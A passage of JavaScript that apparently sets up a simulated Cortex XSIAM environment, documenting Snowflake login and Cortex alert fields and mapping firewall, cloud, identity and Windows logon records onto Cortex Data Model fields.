    snowflake_snowflake_raw: { columns: SF_COLUMNS, rows: SF_ROWS, kind: 'dataset', description: 'Snowflake LOGIN_HISTORY rows from the prod collector. Field names are upper case; there is no _reporting_device_name field.', fieldDocs: { EVENT_TYPE: 'LOGIN.', USER_NAME: 'Upper-case user name (UPN for SSO users).', CLIENT_IP: 'Client address.', REPORTED_CLIENT_TYPE: 'SNOWFLAKE_UI, JDBC_DRIVER, PYTHON_DRIVER, OTHER.', FIRST_AUTHENTICATION_FACTOR: 'PASSWORD, SAML2, OAUTH_ACCESS_TOKEN, RSA_KEYPAIR.', SECOND_AUTHENTICATION_FACTOR: 'MFA factor or null.', IS_SUCCESS: '"YES" or "NO" (strings).', ERROR_CODE: 'Snowflake error code on failure.', ERROR_MESSAGE: 'Failure text.', _collector_name: 'Collector that produced the row.' } },
    alerts: { columns: ALERT_COLUMNS, rows: ALERT_ROWS, kind: 'dataset', description: 'Cortex alerts, one row per alert. Network and MITRE fields are arrays; alert_source and severity are enum-backed.', fieldDocs: { alert_name: 'Alert title. IOC alerts are named "IOC (IP) <address>".', alert_source: 'XDR_IOC, XDR_BIOC, XDR_ANALYTICS, XDR_AGENT, CORRELATION.', severity: 'SEV_020_LOW, SEV_030_MEDIUM, SEV_040_HIGH, SEV_050_CRITICAL.', category: 'Alert category.', action: 'DETECTED or PREVENTED.', host_name: 'Endpoint, null for network and cloud alerts.', host_ip: 'Array of host addresses.', user_name: 'Array of users.', local_ip: 'Array. For flow-log IOC alerts XSIAM maps srcaddr here, so an ALB reply record shows the ALB as local_ip.', local_port: 'Array.', remote_ip: 'Array.', remote_port: 'Array.', event_timestamp: 'When the underlying event happened (retroactive IOC alerts carry an older event time than _time).', mitre_tactic_id_and_name: 'Array.', mitre_technique_id_and_name: 'Array.', incident_id: 'Incident the alert was grouped into.' } },
  });

  // ---- Cortex Data Model: how each dataset maps to xdm.* fields (used by datamodel queries) -----------------------------------
  const outcome = (ok) => (ok == null ? 'UNKNOWN' : ok ? 'SUCCESS' : 'FAILED');
  const country = (ip) => (XQL.GEOIP[ip] ? XQL.GEOIP[ip].country : null);
  const NET = (src, sport, dst, dport, proto, out, action, rule, user, up, down, observer, type) => ({ 'xdm.event.type': type || 'NETWORK', 'xdm.event.outcome': out, 'xdm.observer.action': action, 'xdm.network.rule': rule, 'xdm.network.ip_protocol': proto, 'xdm.source.ipv4': src, 'xdm.source.port': sport, 'xdm.source.user.username': user, 'xdm.source.sent_bytes': up, 'xdm.source.location.country': country(src), 'xdm.target.ipv4': dst, 'xdm.target.port': dport, 'xdm.target.sent_bytes': down, 'xdm.target.location.country': country(dst), 'xdm.observer.name': observer });
  const AUTH = (user, src, out, reason, method, app, observer, srcHost) => ({ 'xdm.event.type': 'AUTHENTICATION', 'xdm.event.operation': 'LOGIN', 'xdm.event.outcome': out, 'xdm.event.outcome_reason': reason, 'xdm.auth.auth_method': method, 'xdm.source.ipv4': src, 'xdm.source.user.username': user, 'xdm.source.user.upn': user && user.includes('@') ? user.toLowerCase() : null, 'xdm.source.location.country': country(src), 'xdm.source.host.hostname': srcHost || null, 'xdm.target.resource.name': app, 'xdm.observer.name': observer });
  XQL.XDM_FIELDS = ['xdm.event.type', 'xdm.event.operation', 'xdm.event.outcome', 'xdm.event.outcome_reason', 'xdm.observer.action', 'xdm.observer.name', 'xdm.network.rule', 'xdm.network.ip_protocol', 'xdm.auth.auth_method', 'xdm.source.ipv4', 'xdm.source.port', 'xdm.source.user.username', 'xdm.source.user.upn', 'xdm.source.host.hostname', 'xdm.source.sent_bytes', 'xdm.source.location.country', 'xdm.target.ipv4', 'xdm.target.port', 'xdm.target.sent_bytes', 'xdm.target.location.country', 'xdm.target.resource.name'];
  XQL.XDM_FIELDSETS = { xdm_network: ['xdm.source.ipv4', 'xdm.source.port', 'xdm.target.ipv4', 'xdm.target.port', 'xdm.network.ip_protocol', 'xdm.event.outcome', 'xdm.observer.action', 'xdm.network.rule', 'xdm.source.sent_bytes', 'xdm.target.sent_bytes'], xdm_auth: ['xdm.source.user.username', 'xdm.source.ipv4', 'xdm.event.outcome', 'xdm.event.outcome_reason', 'xdm.auth.auth_method', 'xdm.target.resource.name', 'xdm.source.location.country'] };
  XQL.XDM_CONST = { OUTCOME_SUCCESS: 'SUCCESS', OUTCOME_FAILED: 'FAILED', OUTCOME_UNKNOWN: 'UNKNOWN', OPERATION_TYPE_AUTH_LOGIN: 'LOGIN', EVENT_TAG_AUTHENTICATION: 'AUTHENTICATION' };
  const PROTO_NAME = { 6: 'TCP', 17: 'UDP', 1: 'ICMP', tcp: 'TCP', udp: 'UDP', T: 'TCP', U: 'UDP' };
  XQL.XDM_MAPPINGS = {
    xdr_data: (r) => (r.event_type === 2 ? NET(r.action_local_ip, r.action_local_port, r.action_remote_ip, r.action_remote_port, PROTO_NAME[r.action_network_protocol] || null, 'SUCCESS', 'ALLOW', null, r.actor_effective_username, r.action_total_upload, r.action_total_download, r.agent_hostname || r.agent_id) : null),
    panw_ngfw_traffic_raw: (r) => NET(r.source_ip, null, r.dest_ip, r.dest_port, PROTO_NAME[r.protocol] || null, r.action === 'allow' ? 'SUCCESS' : 'FAILED', r.action === 'allow' ? 'ALLOW' : 'DENY', r.rule_matched, r.source_user, r.bytes_sent, r.bytes_received, r.log_source_name),
    panw_ngfw_threat_raw: (r) => NET(r.source_ip, r.source_port, r.dest_ip, r.dest_port, 'TCP', r.action === 'alert' ? 'SUCCESS' : 'FAILED', r.action === 'alert' ? 'ALLOW' : 'DENY', r.rule_matched, r.source_user, null, null, r.log_source_name, 'THREAT'),
    msft_azure_flowlogs_raw: (r) => NET(r.sourceAddress, r.sourcePort, r.destinationAddress, r.destinationPort, PROTO_NAME[r.protocol] || null, r.deviceAction === 'A' ? 'SUCCESS' : 'FAILED', r.deviceAction === 'A' ? 'ALLOW' : 'DENY', r.nsgRuleName, null, r.bytesSent, r.bytesReceived, 'NSG-APP-PROD'),
    amazon_aws_raw: (r) => (r._log_type === 'flowlogs' ? NET(r.srcaddr, r.srcport, r.dstaddr, r.dstport, PROTO_NAME[r.protocol] || null, r.action === 'ACCEPT' ? 'SUCCESS' : 'FAILED', r.action === 'ACCEPT' ? 'ALLOW' : 'DENY', null, null, r.bytes, null, r.interface_id)
      : r.eventName === 'ConsoleLogin' ? AUTH(XQL.jsonPath(JSON.parse(r.userIdentity), 'userName') || XQL.jsonPath(JSON.parse(r.userIdentity), 'type'), r.sourceIPAddress, outcome(JSON.parse(r.responseElements || '{}').ConsoleLogin === 'Success'), r.errorMessage, JSON.parse(r.additionalEventData || '{}').MFAUsed === 'Yes' ? 'MFA' : 'PASSWORD', 'AWS Console', `aws:${r.recipientAccountId}`) : null),
    msft_azure_ad_raw: (r) => { const st = JSON.parse(r.status || '{}'); return AUTH(r.userPrincipalName || r.servicePrincipalName, r.ipAddress, outcome(st.errorCode === 0), st.errorCode === 0 ? null : `${st.errorCode}: ${st.failureReason}`, r.authenticationRequirement === 'multiFactorAuthentication' ? 'MFA' : 'PASSWORD', r.appDisplayName, 'Entra ID', JSON.parse(r.deviceDetail || '{}').displayName || null); },
    panw_ngfw_globalprotect_raw: (r) => (/auth/.test(r.event_id) ? AUTH(r.source_user, r.public_ip, outcome(r.status === 'success'), r.error, r.auth_method, 'GlobalProtect', r.gateway, r.endpoint_device_name) : null),
    snowflake_snowflake_raw: (r) => AUTH(r.USER_NAME, r.CLIENT_IP, outcome(r.IS_SUCCESS === 'YES'), r.ERROR_MESSAGE, r.SECOND_AUTHENTICATION_FACTOR ? 'MFA' : r.FIRST_AUTHENTICATION_FACTOR, 'Snowflake', 'snowflake-prod'),
    microsoft_windows_raw: (r) => { if (r.event_id !== 4624 && r.event_id !== 4625) return null; const d = JSON.parse(r.event_data); return AUTH(d.TargetUserName, d.IpAddress === '-' ? null : d.IpAddress, outcome(r.event_id === 4624), r.event_id === 4625 ? d.Status : null, d.LogonType === '10' ? 'RDP' : d.LogonType === '3' ? 'NETWORK' : 'INTERACTIVE', r.host_name, r.host_name, d.WorkstationName); },
  };

  XQL.TENANT = { DOMAIN, OFFICE_EGRESS, VPN_EGRESS, ATK_KEYS, ATK_SPRAY, ATK_SCAN, ATK_LEGACY, ALB, APP, AZ_VM, ACCT_PROD, ACCT_NONPROD, ACCOUNT_NAMES, FW_PROD, PA_GW };
})(typeof globalThis !== 'undefined' ? globalThis : this);
